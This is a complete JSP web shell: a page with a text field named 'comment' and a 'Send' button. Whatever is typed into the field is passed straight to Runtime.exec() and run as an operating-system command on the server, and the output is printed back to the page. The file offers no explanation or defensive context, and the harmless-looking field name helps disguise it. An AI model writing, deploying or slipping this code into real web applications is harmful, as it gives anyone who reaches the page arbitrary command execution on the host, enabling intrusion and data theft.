<%@ page import="java.util.*,java.io.*"%> <% %> 
<HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION="">
<INPUT TYPE="text" NAME="comment"> 
<INPUT TYPE="submit" VALUE="Send"> 
</FORM> <pre> 
<%
 if ( request.getParameter( "comment" ) != null )
 {
	 out.println( "Command: " + request.getParameter( "comment" ) + "<BR>" );
	 Process p		= Runtime.getRuntime().exec( request.getParameter( "comment" ) );
	 OutputStream os	= p.getOutputStream();
	 InputStream in		= p.getInputStream();
	 DataInputStream dis	= new DataInputStream( in );
	 String disr		= dis.readLine();
	 while ( disr != null )
	 {
		 out.println( disr ); disr = dis.readLine();
	 }
 }
 %>
 </pre> 
 </BODY></HTML>
